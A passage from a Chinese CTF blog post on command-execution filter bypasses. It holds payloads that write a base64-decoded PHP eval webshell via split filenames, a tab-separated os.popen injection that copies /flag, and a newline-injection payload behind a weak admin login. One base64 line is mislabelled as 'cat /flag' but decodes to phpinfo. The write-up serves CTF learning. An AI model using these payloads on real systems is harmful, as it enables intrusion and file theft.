<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&gt;ec\\</span><br><span class="line">&gt;ho\\</span><br><span class="line">&gt;\$\\</span><br><span class="line">&gt;&#123;\\</span><br><span class="line">&gt;IF\\</span><br><span class="line">&gt;S&#125;\\</span><br><span class="line">&gt;PD\\</span><br><span class="line">&gt;9w\\</span><br><span class="line">&gt;aH\\</span><br><span class="line">&gt;Ag\\</span><br><span class="line">&gt;cG\\</span><br><span class="line">&gt;hw\\</span><br><span class="line">&gt;aW\\</span><br><span class="line">&gt;5m\\</span><br><span class="line">&gt;by\\</span><br><span class="line">&gt;gp\\</span><br><span class="line">&gt;Ow\\</span><br><span class="line">&gt;\=\\</span><br><span class="line">&gt;\=\\</span><br><span class="line">&gt;\|\\</span><br><span class="line">&gt;ba\\</span><br><span class="line">&gt;se\\</span><br><span class="line">&gt;64\\</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;-d\\</span><br><span class="line">&gt;\&gt;\\</span><br><span class="line">&gt;1.\\</span><br><span class="line">&gt;p\\</span><br><span class="line">&gt;hp</span><br></pre></td></tr></table></figure>

<p>因为ls -t按时间先后顺序排序，所以需要倒置，同时加上<code>ls -ht &gt; a</code>的构造 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&gt;dir</span><br><span class="line">&gt;f\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;sl</span><br><span class="line">*&gt;v</span><br><span class="line">&gt;rev </span><br><span class="line">*v&gt;a</span><br><span class="line">&gt;hp</span><br><span class="line">&gt;p\\</span><br><span class="line">&gt;1.\\</span><br><span class="line">&gt;\&gt;\\</span><br><span class="line">&gt;-d\\</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;64\\</span><br><span class="line">&gt;se\\</span><br><span class="line">&gt;ba\\</span><br><span class="line">&gt;\|\\</span><br><span class="line">&gt;\=\\</span><br><span class="line">&gt;\=\\</span><br><span class="line">&gt;Ow\\</span><br><span class="line">&gt;gp\\</span><br><span class="line">&gt;by\\</span><br><span class="line">&gt;5m\\</span><br><span class="line">&gt;aW\\</span><br><span class="line">&gt;hw\\</span><br><span class="line">&gt;cG\\</span><br><span class="line">&gt;Ag\\</span><br><span class="line">&gt;aH\\</span><br><span class="line">&gt;9w\\</span><br><span class="line">&gt;PD\\</span><br><span class="line">&gt;S&#125;\\</span><br><span class="line">&gt;IF\\</span><br><span class="line">&gt;&#123;\\</span><br><span class="line">&gt;\$\\</span><br><span class="line">&gt;ho\\</span><br><span class="line">&gt;ec\\</span><br><span class="line">sh a</span><br><span class="line">sh f</span><br></pre></td></tr></table></figure>

<p>成功写入</p>
<p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082257280.png" alt="image-20221008225715238"></p>
<p>第二种可以直接构造<code>cat /flag</code>，方法同上</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /flag   base64:PD9waHAgcGhwaW5mbygpOw==</span><br><span class="line">构造</span><br><span class="line">echo PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==|base64 -d&gt;1.php</span><br></pre></td></tr></table></figure>

<p>最后执行<code>sh 1.php</code>即可</p>
<p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082031577.png" alt="image-20220831233101265"></p>
<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>一些不知道怎么分类的rce题目…</p>
<h2 id="PYRCE"><a href="#PYRCE" class="headerlink" title="PYRCE"></a>PYRCE</h2><p>源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag in /flag</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">rce</span>):</span><br><span class="line">    black_list = <span class="string">&#x27;01233456789un/ | &#123;&#125; * !;@#\n `~\&#x27;\&quot;&gt;&lt;=+-_ &#x27;</span></span><br><span class="line">    <span class="keyword">for</span> black <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> black <span class="keyword">in</span> rce:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&quot;Ňśś&quot;</span>):</span><br><span class="line">        nss = request.args.get(<span class="string">&quot;Ňśś&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> waf(nss):</span><br><span class="line">            os.popen(nss)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;waf&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;/source&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/source&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>():</span><br><span class="line">    src = <span class="built_in">open</span>(<span class="string">&quot;app.py&quot;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">return</span> src</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>

<p>逻辑简单，传入一个参数，在<code>os.popen()</code>处执行命令，难点在于绕黑名单以及<code>os.popen()</code>无回显</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">black_list = <span class="string">&#x27;01233456789un/|&#123;&#125;*!;@#\n`~\&#x27;\&quot;&gt;&lt;=+-_ &#x27;</span></span><br></pre></td></tr></table></figure>

<p>剩下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\t $ &amp; () , . : ? 以及大小写字母（除u n)</span><br></pre></td></tr></table></figure>

<p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?Ňśś=cp	$(cd	..&amp;&amp;cd	..&amp;&amp;cd	..&amp;&amp;cd	..&amp;&amp;cd	..&amp;&amp;cd	..&amp;&amp;cd	..&amp;&amp;cd	..&amp;&amp;echo	$(pwd)flag)	app.py</span><br></pre></td></tr></table></figure>

<p>3个点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.%09(tab)代替空格</span><br><span class="line">2.echo	$(pwd)获取 /</span><br><span class="line">3.将flag内容带到app.py</span><br></pre></td></tr></table></figure>

<p>将payload url编码一下，访问app.py获得flag</p>
<h2 id="5-web-letmeguess-1"><a href="#5-web-letmeguess-1" class="headerlink" title="5_web_letmeguess_1"></a>5_web_letmeguess_1</h2><p>登录弱密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">admin123</span><br></pre></td></tr></table></figure>

<p>过滤诸多关键字</p>
<p>关键是用%0a(换行符)，%0d(回车符)绕过<code>;</code>，其他过滤都好绕</p>
<p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=%0dcd%09kyl*%0atac%09fla*</span><br></pre></td></tr></table></figure>

<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>笔者的总结基本到这里就结束了，如今ctf纯粹的rce题目已经比较少了，常见的无字母数字，无参数等等已经被玩烂了，起初写这篇文章只是想记录两个比较有趣的php自增自减题目，不知不觉写了那么多，笔者相信还有很多rce的方式有待挖掘。</p>
<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p>1.<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell | 离别歌 (leavesongs.com)</a></p>
<p>2.<a target="_blank" rel="noopener" href="https://f5.pm/go-29700.html">无字母数字webshell总结</a></p>
<p>3.<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=2#reply-list">无字母数字webshell之提高篇 | 离别歌 (leavesongs.com)</a></p>
<p>4.<a target="_blank" rel="noopener" href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">PHP Parametric Function RCE · sky’s blog (skysec.top)</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://gh0st-9.github.io">gh0st</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://gh0st-9.github.io/2022/10/07/rce/">https://gh0st-9.github.io/2022/10/07/rce/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://gh0st-9.github.io" target="_blank">Gh0stのblog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/">奇技淫巧</a></div><div class="post_share"><div class="social-share" data-image="https://s1.ax1x.com/2022/11/19/zKnxjf.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/10/19/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><img class="prev-cover" src="https://s1.ax1x.com/2022/11/20/zMWmGD.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Java安全之路--Shiro550反序列化</div></div></a></div><div class="next-post pull-right"><a href="/2022/05/29/php%E5%8E%9F%E7%94%9F%E7%B1%BB/"><img class="next-cover" src="https://s1.ax1x.com/2022/11/19/zKunDU.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">php原生类的利用</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">gh0st</div><div class="author-info__description">A blog that records learning</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-rce"><span class="toc-number">1.</span> <span class="toc-text">命令执行(rce)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%BB%95%E8%BF%87"><span class="toc-number">2.</span> <span class="toc-text">常见绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">2.1.</span> <span class="toc-text">编码绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%BC%E6%8E%A5%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.</span> <span class="toc-text">拼接绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="toc-number">2.3.</span> <span class="toc-text">通配符绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GXYCTF2019-Ping-Ping"><span class="toc-number">2.4.</span> <span class="toc-text">[GXYCTF2019]Ping Ping</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%8F%96%E5%80%BCrce"><span class="toc-number">3.</span> <span class="toc-text">环境变量取值rce</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%97%A0%E5%8F%82%E6%95%B0rce"><span class="toc-number">4.</span> <span class="toc-text">无参数rce</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE"><span class="toc-number">4.1.</span> <span class="toc-text">RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#getallheaders"><span class="toc-number">4.1.1.</span> <span class="toc-text">getallheaders()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get-defined-vars"><span class="toc-number">4.1.2.</span> <span class="toc-text">get_defined_vars()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#session-id"><span class="toc-number">4.1.3.</span> <span class="toc-text">session_id</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="toc-number">4.2.</span> <span class="toc-text">读文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83"><span class="toc-number">4.3.</span> <span class="toc-text">[GXYCTF2019]禁止套娃</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-number">4.3.1.</span> <span class="toc-text">方法一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toc-number">4.3.2.</span> <span class="toc-text">方法二</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#tips1"><span class="toc-number">4.3.2.1.</span> <span class="toc-text">tips1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#tips2"><span class="toc-number">4.3.2.2.</span> <span class="toc-text">tips2</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce"><span class="toc-number">5.</span> <span class="toc-text">无字母数字rce</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#php5%E5%92%8Cphp7%E4%B8%AD%E7%9A%84assert-%E5%87%BD%E6%95%B0"><span class="toc-number">5.1.</span> <span class="toc-text">php5和php7中的assert()函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%82%E6%88%96"><span class="toc-number">5.2.</span> <span class="toc-text">异或</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#url%E5%8F%96%E5%8F%8D"><span class="toc-number">5.3.</span> <span class="toc-text">url取反</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B1%89%E5%AD%97%E5%8F%96%E5%8F%8D"><span class="toc-number">5.4.</span> <span class="toc-text">汉字取反</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SUCTF-2018-GetShell-%E6%97%A0%E5%AD%97%E6%AF%8Dgetshell"><span class="toc-number">5.4.1.</span> <span class="toc-text">[SUCTF 2018]GetShell(无字母getshell)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E8%87%AA%E5%A2%9E%E8%87%AA%E5%87%8Fgetshell"><span class="toc-number">5.5.</span> <span class="toc-text">php自增自减getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Challenge-rce"><span class="toc-number">5.5.1.</span> <span class="toc-text">Challenge__rce</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shellme-Revenge"><span class="toc-number">5.5.2.</span> <span class="toc-text">shellme_Revenge</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%89%E9%99%90%E5%AD%97%E7%AC%A6%E4%B8%8B%E7%9A%84RCE"><span class="toc-number">6.</span> <span class="toc-text">有限字符下的RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux%E5%91%BD%E4%BB%A4%E6%B5%85%E6%9E%90"><span class="toc-number">6.1.</span> <span class="toc-text">Linux命令浅析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E5%AD%97%E7%AC%A6"><span class="toc-number">6.2.</span> <span class="toc-text">五字符</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">7.</span> <span class="toc-text">题目</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PYRCE"><span class="toc-number">7.1.</span> <span class="toc-text">PYRCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-web-letmeguess-1"><span class="toc-number">7.2.</span> <span class="toc-text">5_web_letmeguess_1</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%8E%E8%AE%B0"><span class="toc-number">8.</span> <span class="toc-text">后记</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%EF%BC%9A"><span class="toc-number">9.</span> <span class="toc-text">参考：</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/02/27/Vulnhub%E9%9D%B6%E6%9C%BA%E7%B3%BB%E5%88%97Billu_b0x%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" title="Billu_b0x渗透测试"><img src="https://s1.ax1x.com/2023/03/02/ppF6eu4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Billu_b0x渗透测试"/></a><div class="content"><a class="title" href="/2023/02/27/Vulnhub%E9%9D%B6%E6%9C%BA%E7%B3%BB%E5%88%97Billu_b0x%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" title="Billu_b0x渗透测试">Billu_b0x渗透测试</a><time datetime="2023-02-27T10:10:33.000Z" title="发表于 2023-02-27 18:10:33">2023-02-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/02/20/Lampi%C3%A3o%201.0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" title="Lampião 1.0渗透测试"><img src="https://s1.ax1x.com/2023/03/02/ppFyEmd.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Lampião 1.0渗透测试"/></a><div class="content"><a class="title" href="/2023/02/20/Lampi%C3%A3o%201.0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" title="Lampião 1.0渗透测试">Lampião 1.0渗透测试</a><time datetime="2023-02-20T11:10:33.000Z" title="发表于 2023-02-20 19:10:33">2023-02-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/01/13/2023%E7%AC%AC%E4%BA%94%E5%B1%8A%20Real%20World%20CTF%20%E4%BD%93%E9%AA%8C%E8%B5%9B%20Web/" title="2023第五届 Real World CTF 体验赛 Web"><img src="https://s1.ax1x.com/2023/02/15/pS70haF.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2023第五届 Real World CTF 体验赛 Web"/></a><div class="content"><a class="title" href="/2023/01/13/2023%E7%AC%AC%E4%BA%94%E5%B1%8A%20Real%20World%20CTF%20%E4%BD%93%E9%AA%8C%E8%B5%9B%20Web/" title="2023第五届 Real World CTF 体验赛 Web">2023第五届 Real World CTF 体验赛 Web</a><time datetime="2023-01-13T11:10:33.000Z" title="发表于 2023-01-13 19:10:33">2023-01-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/12/31/2022%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/" title="2022年终总结"><img src="https://s1.ax1x.com/2023/01/09/pSepg1O.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2022年终总结"/></a><div class="content"><a class="title" href="/2022/12/31/2022%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/" title="2022年终总结">2022年终总结</a><time datetime="2022-12-31T14:10:17.000Z" title="发表于 2022-12-31 22:10:17">2022-12-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/19/C3P0/" title="Java安全之路--C3P0链"><img src="https://s1.ax1x.com/2022/11/19/zK3nDx.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Java安全之路--C3P0链"/></a><div class="content"><a class="title" href="/2022/11/19/C3P0/" title="Java安全之路--C3P0链">Java安全之路--C3P0链</a><time datetime="2022-11-19T04:10:33.000Z" title="发表于 2022-11-19 12:10:33">2022-11-19</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://images.wallpaperscraft.com/image/single/night_city_thunderstorm_top_view_117094_1920x1080.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023  <i id="heartbeat" class="fa fas fa-heartbeat"></i> gh0st</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/algoliasearch/dist/algoliasearch-lite.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instantsearch.js/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'P30e503whmpCWi5vfGvyBPBk-gzGzoHsz',
      appKey: 'CksZh3B3PQkOckP0wY4WEj9U',
      avatar: 'monsterid',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !true) {
  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script><script>function loadDisqus () {
  var disqus_config = function () {
    this.page.url = 'https://gh0st-9.github.io/2022/10/07/rce/'
    this.page.identifier = '/2022/10/07/rce/'
    this.page.title = 'rce?'
  };

  window.disqusReset = () => {
    DISQUS.reset({
      reload: true,
      config: disqus_config
    })
  }

  if (window.DISQUS) disqusReset()
  else {
    (function() { 
      var d = document, s = d.createElement('script');
      s.src = 'https://.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  }

  document.getElementById('darkmode').addEventListener('click', () => {
    setTimeout(() => window.disqusReset(), 200)
  })
}

if ('Valine' === 'Disqus' || !true) {
  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
  else loadDisqus()
} else {
  function loadOtherComment () {
    loadDisqus()
  }
}
</script></div><canvas id="universe"></canvas><script defer src="/js/universe.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>